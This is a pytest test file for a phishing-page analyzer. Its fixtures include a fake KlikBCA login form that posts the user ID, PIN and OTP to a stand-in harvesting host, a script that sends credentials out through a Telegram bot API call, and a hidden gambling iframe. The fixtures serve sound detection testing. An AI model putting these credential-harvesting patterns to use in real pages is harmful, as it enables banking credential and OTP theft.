# tests/test_form_analyzer.py
import pytest
from strikerr.apps.analyzer.extractors.form_analyzer import FormPhishingAnalyzer

def test_detects_phishing_form_action_mismatch_and_otp():
    phishing_html = """
    <html>
      <body>
        <h2>Login KlikBCA Individu</h2>
        <form action="http://malicious-drop-zone.xyz/harvest.php" method="POST">
          <input type="text" name="user_id" placeholder="User ID">
          <input type="password" name="password" placeholder="PIN Internet Banking">
          <input type="text" name="keybca_otp" placeholder="Respon KeyBCA Appli 1">
          <button type="submit">Kirim</button>
        </form>
      </body>
    </html>
    """
    res = FormPhishingAnalyzer.analyze_dom(phishing_html, "https://klikbca.com/login.html")
    assert res['has_deceptive_login_form'] is True
    assert res['has_password_field'] is True
    assert res['has_otp_field'] is True
    assert res['form_action_mismatch'] is True

def test_detects_telegram_bot_token_exfiltration():
    html_with_bot = """
    <html>
      <head>
        <script>
          function sendExfil(user, pass) {
            var botToken = '628192831:AAFlkm-91283x_Lkm912';
            var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=12345&text=' + user;
            fetch(url);
          }
        </script>
      </head>
      <body>Phishing Page with Bot</body>
    </html>
    """
    res = FormPhishingAnalyzer.analyze_dom(html_with_bot, "https://fake-login.com")
    assert res['has_telegram_exfiltration'] is True
    assert len(res['exfiltration_endpoints']) >= 1

def test_detects_hidden_cloaking_iframe():
    html_with_iframe = """
    <html>
      <body>
        <h1>Pemerintah Kabupaten Portal Berita</h1>
        <iframe src="https://slot88-gacor-olympus.xyz" style="display:none; visibility:hidden;" width="0" height="0"></iframe>
      </body>
    </html>
    """
    res = FormPhishingAnalyzer.analyze_dom(html_with_iframe, "https://pemkab.go.id")
    assert res['has_hidden_iframe'] is True
    assert "https://slot88-gacor-olympus.xyz" in res['hidden_iframes']
